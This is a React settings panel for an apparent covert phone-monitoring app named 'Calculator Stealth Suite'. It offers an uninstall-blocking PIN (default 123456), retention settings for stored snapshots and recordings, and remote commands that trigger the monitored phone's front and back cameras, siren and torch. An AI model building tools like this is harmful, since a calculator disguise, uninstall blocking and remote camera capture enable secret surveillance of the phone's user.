import React, { useState } from "react";
import { User as FirebaseUser } from "firebase/auth";
import {
  Settings,
  LogOut,
  Lock,
  Clock,
  Trash2,
  RefreshCw,
  CheckCircle,
  Smartphone,
  Flashlight,
  Volume2,
  Camera,
} from "lucide-react";
import { OfflineSmsGuide } from "./OfflineSmsGuide";

interface SettingsTabContentProps {
  user: FirebaseUser;
  activeChildId: string;
  simInfo: any;
  uninstallPin: string;
  onSaveUninstallPin: (pin: string) => void;
  storageRetentionDays: number;
  onUpdateRetention: (days: number) => void;
  isCleaningStorage: boolean;
  cleanupStatusMessage: string | null;
  onRunAutoClean: () => void;
  sendCommand: (cmd: string, val?: any) => void;
  onRequestSnapshot: (facing: "front" | "back") => void;
  capturingFacing: "front" | "back" | null;
  isTorchActive: boolean;
  isSirenActive: boolean;
  audioBoostMultiplier: number;
  setAudioBoostMultiplier: (val: number) => void;
  isClarityFilterEnabled: boolean;
  toggleClarityFilter: (enabled: boolean) => void;
  onLogout: () => void;
}

export function SettingsTabContent({
  user,
  activeChildId,
  simInfo,
  uninstallPin,
  onSaveUninstallPin,
  storageRetentionDays,
  onUpdateRetention,
  isCleaningStorage,
  cleanupStatusMessage,
  onRunAutoClean,
  sendCommand,
  onRequestSnapshot,
  capturingFacing,
  isTorchActive,
  isSirenActive,
  audioBoostMultiplier,
  setAudioBoostMultiplier,
  isClarityFilterEnabled,
  toggleClarityFilter,
  onLogout,
}: SettingsTabContentProps) {
  const [isEditingPin, setIsEditingPin] = useState(false);
  const [pinInputValue, setPinInputValue] = useState(uninstallPin || "123456");

  return (
    <div className="max-w-2xl mx-auto p-4 sm:p-6 bg-[#1B1B24] border border-[#2E2E3C] rounded-2xl shadow-xl flex flex-col gap-6">
      {/* Header */}
      <div className="flex items-center justify-between border-b border-[#2E2E3C] pb-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-blue-600/20 text-blue-400 rounded-xl">
            <Settings className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-base font-bold text-white">App & Device Settings (सेटिंग्स)</h2>
            <p className="text-xs text-gray-400">Uninstall protection, Cloud auto-clean, SMS & Remote controls</p>
          </div>
        </div>
        <button
          onClick={onLogout}
          className="px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer"
        >
          <LogOut className="w-3.5 h-3.5" />
          <span>Sign Out</span>
        </button>
      </div>

      {/* 1: Uninstall Protection Password */}
      <div className="p-4 bg-[#14141A] border border-[#262632] rounded-xl flex flex-col gap-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="p-1.5 bg-amber-500/20 text-amber-400 rounded-lg">
              <Lock className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-xs font-bold text-white">Uninstall Protection Password</h3>
              <p className="text-[11px] text-gray-400">6-Digit security PIN required to uninstall or remove app</p>
            </div>
          </div>
          <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30">
            PROTECTED
          </span>
        </div>

        <div className="p-3 bg-[#1B1B24] rounded-xl border border-[#2B2B38] flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div>
            <span className="text-[10px] uppercase font-bold text-gray-500">Active Uninstall PIN:</span>
            <div className="flex items-center gap-2 mt-0.5">
              <span className="text-xl font-mono font-bold tracking-widest text-emerald-400">
                {uninstallPin || "123456"}
              </span>
              <span className="text-[10px] text-gray-400">(Default: 123456)</span>
            </div>
          </div>

          {!isEditingPin ? (
            <button
              type="button"
              onClick={() => { setPinInputValue(uninstallPin || "123456"); setIsEditingPin(true); }}
              className="px-3 py-1.5 bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/30 rounded-xl text-xs font-semibold transition cursor-pointer"
            >
              Change PIN (पासवर्ड बदलें)
            </button>
          ) : (
            <div className="flex items-center gap-2 w-full sm:w-auto">
              <input
                type="text"
                maxLength={6}
                value={pinInputValue}
                onChange={(e) => setPinInputValue(e.target.value.replace(/\D/g, ""))}
                placeholder="6-digit PIN"
                className="w-28 px-2.5 py-1.5 bg-[#121217] border border-blue-500/60 rounded-xl text-white font-mono text-center text-sm font-bold focus:outline-none"
              />
              <button
                type="button"
                onClick={() => { onSaveUninstallPin(pinInputValue); setIsEditingPin(false); }}
                disabled={pinInputValue.length !== 6}
                className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white rounded-xl text-xs font-bold transition cursor-pointer"
              >
                Save
              </button>
              <button
                type="button"
                onClick={() => setIsEditingPin(false)}
                className="px-2.5 py-1.5 bg-[#252530] text-gray-400 hover:text-white rounded-xl text-xs transition cursor-pointer"
              >
                Cancel
              </button>
            </div>
          )}
        </div>
      </div>

      {/* 2: Cloud 7-Day Auto-Delete & Retention */}
      <div className="p-4 bg-[#14141A] border border-[#262632] rounded-xl flex flex-col gap-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="p-1.5 bg-blue-600/20 text-blue-400 rounded-lg">
              <Clock className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-xs font-bold text-white">Cloud Storage 7-Day Auto-Delete</h3>
              <p className="text-[11px] text-gray-400">Purge snapshots & recordings to keep Firebase 100% Free</p>
            </div>
          </div>
          <button
            type="button"
            onClick={onRunAutoClean}
            disabled={isCleaningStorage || storageRetentionDays === 0}
            className="px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-300 border border-red-500/30 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer"
          >
            {isCleaningStorage ? <RefreshCw className="w-3.5 h-3.5 animate-spin text-red-400" /> : <Trash2 className="w-3.5 h-3.5 text-red-400" />}
            <span>{isCleaningStorage ? "Cleaning..." : "Clean 7-Day Data Now"}</span>
          </button>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 pt-1">
          {[
            { days: 1, label: "1 Day", desc: "Purge daily" },
            { days: 7, label: "7 Days", desc: "Recommended (Free tier)" },
            { days: 14, label: "14 Days", desc: "Bi-weekly" },
            { days: 28, label: "28 Days", desc: "Monthly" },
            { days: 0, label: "Never", desc: "Keep forever" },
          ].map((opt) => {
            const isSelected = storageRetentionDays === opt.days;
            return (
              <button
                key={opt.days}
                type="button"
                onClick={() => onUpdateRetention(opt.days)}
                className={`p-2.5 rounded-xl border text-left transition cursor-pointer flex flex-col justify-between ${
                  isSelected ? "bg-blue-600/20 border-blue-500 text-blue-300 shadow" : "bg-[#181820] border-[#292938] text-gray-400 hover:border-gray-600"
                }`}
              >
                <div className="flex items-center justify-between mb-0.5">
                  <span className={`text-xs font-bold ${isSelected ? "text-blue-400" : "text-gray-200"}`}>{opt.label}</span>
                  {isSelected && <CheckCircle className="w-3 h-3 text-blue-400" />}
                </div>
                <span className="text-[10px] text-gray-500">{opt.desc}</span>
              </button>
            );
          })}
        </div>

        {cleanupStatusMessage && (
          <div className="p-2.5 bg-emerald-950/40 border border-emerald-800/40 rounded-xl text-xs text-emerald-300 flex items-center gap-2">
            <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{cleanupStatusMessage}</span>
          </div>
        )}
      </div>

      {/* 3: Offline SMS Remote Fallback */}
      <OfflineSmsGuide simInfo={simInfo} />

      {/* 4: Quick Remote Hardware Controls */}
      <div className="p-4 bg-[#14141A] border border-[#262632] rounded-xl flex flex-col gap-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="p-1.5 bg-purple-600/20 text-purple-400 rounded-lg">
              <Smartphone className="w-4 h-4" />
            </div>
            <h3 className="text-xs font-bold text-white">Remote Phone Commands</h3>
          </div>
          <span className="text-[10px] text-emerald-400 font-semibold flex items-center gap-1">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> Live RTDB
          </span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
          <button
            type="button"
            onClick={() => sendCommand("TORCH", !isTorchActive)}
            className={`p-3 rounded-xl border text-left transition flex flex-col justify-between ${
              isTorchActive ? "bg-amber-500/20 border-amber-500 text-amber-300" : "bg-[#181820] border-[#292938] text-gray-300"
            }`}
          >
            <Flashlight className={`w-4 h-4 mb-1.5 ${isTorchActive ? "text-amber-400" : "text-gray-400"}`} />
            <span className="text-xs font-bold text-white">{isTorchActive ? "Torch Band" : "Torch Chalu"}</span>
          </button>

          <button
            type="button"
            onClick={() => sendCommand("SIREN", !isSirenActive)}
            className={`p-3 rounded-xl border text-left transition flex flex-col justify-between ${
              isSirenActive ? "bg-red-600/20 border-red-500 text-red-300" : "bg-[#181820] border-[#292938] text-gray-300"
            }`}
          >
            <Volume2 className={`w-4 h-4 mb-1.5 ${isSirenActive ? "text-red-400 animate-bounce" : "text-gray-400"}`} />
            <span className="text-xs font-bold text-white">{isSirenActive ? "Siren Band" : "Siren Bajayein"}</span>
          </button>

          <button
            type="button"
            onClick={() => onRequestSnapshot("back")}
            disabled={capturingFacing !== null}
            className="p-3 rounded-xl border bg-[#181820] border-[#292938] text-left transition hover:border-gray-600 disabled:opacity-50 flex flex-col justify-between"
          >
            <Camera className="w-4 h-4 mb-1.5 text-purple-400" />
            <span className="text-xs font-bold text-white">Back Photo</span>
          </button>

          <button
            type="button"
            onClick={() => onRequestSnapshot("front")}
            disabled={capturingFacing !== null}
            className="p-3 rounded-xl border bg-[#181820] border-[#292938] text-left transition hover:border-gray-600 disabled:opacity-50 flex flex-col justify-between"
          >
            <Camera className="w-4 h-4 mb-1.5 text-blue-400" />
            <span className="text-xs font-bold text-white">Front Selfie</span>
          </button>

          <button
            type="button"
            onClick={() => sendCommand("VIBRATE", 2000)}
            className="p-3 rounded-xl border bg-[#181820] border-[#292938] text-left transition hover:border-gray-600 flex flex-col justify-between"
          >
            <Smartphone className="w-4 h-4 mb-1.5 text-emerald-400" />
            <span className="text-xs font-bold text-white">Vibrate (2s)</span>
          </button>

          <button
            type="button"
            onClick={() => sendCommand("FORCE_SYNC", true)}
            className="p-3 rounded-xl border bg-[#181820] border-[#292938] text-left transition hover:border-gray-600 flex flex-col justify-between"
          >
            <RefreshCw className="w-4 h-4 mb-1.5 text-cyan-400" />
            <span className="text-xs font-bold text-white">Force Sync</span>
          </button>
        </div>
      </div>

      {/* Footer Info */}
      <div className="text-center pt-2 text-[11px] text-gray-500">
        <p>Calculator Stealth Suite • Version 2.500</p>
        <p className="font-mono text-[10px] text-gray-600">Firebase Region: asia-southeast1 • P2P WebRTC Direct</p>
      </div>
    </div>
  );
}
